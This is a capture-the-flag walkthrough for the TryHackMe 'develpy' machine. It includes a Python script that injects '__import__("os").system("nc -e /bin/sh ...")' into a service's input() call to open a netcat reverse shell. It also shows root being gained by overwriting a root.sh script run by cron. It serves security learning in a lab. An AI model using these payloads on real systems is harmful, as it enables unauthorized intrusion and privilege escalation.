Another time, any tryhackme CTF write-up. This is my fourth boot2me by bsides Guatemala series. You need to know [the basic Python programming](https://www.w3schools.com/python/) and [Python socket](https://www.w3schools.com/python/) as the pre-requisites of this challenge. I strongly recommend you to do some reading on the Python socket before proceeding to this challenge. If you have a strong Python background, this is just a piece of cake for you. 

## Task 1: Capture the flags

Capture the flag is our top priority!

### Task 1-1: Capture user's flag

As always, fire up your Nmap scanner with the following command.

```
nmap -A -v <Machine IP>
```

![nmap](/assets/images/THM/2020-08-08-develpy/2.png)

There are two open ports available which are port 22 (SSH) and port......... 10000? What is port 10000 exactly? Well, it won't hurt to make a visit to the port via the browser. 

![error](/assets/images/THM/2020-08-08-develpy/3.png)

Looks like a Python error handling message. The error highlight the input() function and I guess we have input an invalid value which triggered the error. Huh, that is interesting. How about we create a client socket script to communicate with port 10000?

```python
#Code only compatible with  python3
import socket

host = '10.10.28.237' #Change this
port = 10000

s = socket.socket()
s.connect((host,port))

while 1:
	data = s.recv(2048).decode('utf-8')
	print(data)
	data = s.recv(2048).decode('utf-8')
	print(data)
	s.send(b'1\n') #Send a proper interger value
	message = input('--- Press enter to continue ---')
s.close()
```

I'm going to send a proper input to the server and see what is the response return from the server.

![run script](/assets/images/THM/2020-08-08-develpy/4.png)

Looks like it did return something interesting from the server. How about we send '10' to the server instead of '1'.

![more run](/assets/images/THM/2020-08-08-develpy/5.png)

It returns 10 sequences of ping' like response. Huh........ we are going to exploit the input() function right now. After doing some research, I come across the [python vulnerability](http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html). You can inject a shell inside the input() function. For this challenge, I'm going to create a reverse shell. Use the following python script to create a reverse shell.

```python
import socket

host = '10.10.10.10' # change this
port = 10000

s = socket.socket()
s.connect((host,port))

while 1:
	data = s.recv(2048).decode('utf-8')
	print( data)
	data = s.recv(2048).decode('utf-8')
	print(data)
	s.send(b'__import__("os").system("nc -e /bin/sh <tunnel IP> 4444")\n') # change the tunnel IP
s.close()
```

Make sure you change the [<Tunnel IP>](https://tryhackme.com/access) and open a Netcat listener in your terminal before running the above Python script.

```
nc -lvnp 4444
```

![reverse shell](/assets/images/THM/2020-08-08-develpy/6.png)

Oh yes, you are know created a reverse shell on the victim machine. After that, we are going to spawn a terminal using the following line.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

![spawn shell](/assets/images/THM/2020-08-08-develpy/7.png)

That is much better. We are going to capture the user's flag right now.

![user flag](/assets/images/THM/2020-08-08-develpy/8.png)

### Task 1-2: Capture root's flag

Celebrate now while you can, the next task gonna be very tricky. There are two files caught us some attention which is the run.sh and root.sh.

![root file](/assets/images/THM/2020-08-08-develpy/9.png)

![root file run](/assets/images/THM/2020-08-08-develpy/10.png)

Running the root.sh give us 'permission denied' while run.sh didn't give us any interesting result. In addition, we can't execute sudo -l  because we have zero clues on the king's password. What to do? cronjob perhaps.

![cronjob](/assets/images/THM/2020-08-08-develpy/11.png)

Checking the crontab give us the above result. For your information, the cronjob runs the root.sh and run.sh every second. To verify our finding, I compared the creation time for the .pid file and the current time.

![date](/assets/images/THM/2020-08-08-develpy/12.png)

Yup, the cronjob run every second. By referring back the crontab, the root user somehow bashes the root.sh inside king's directory. If you have followed up my [first boot2root write-up](https://deskel.github.io/posts/thm/library), we can remove the root.sh file and create new content within it. For the sake of simplicity, i only pull the root.txt from the root user.

```
rm root.sh
echo 'cp /root/root.txt /home/king/root.txt' > root.sh
```

Wait for a minute.........

![root flag](/assets/images/THM/2020-08-08-develpy/13.png)

Boom, the root.txt is now presented in king's directory. Read the file and capture the flag.

## Conclusion

That's it, we finished our fourth boot2root by bsides Guatemala walkthrough. Hope you learn something today, until next time ;)
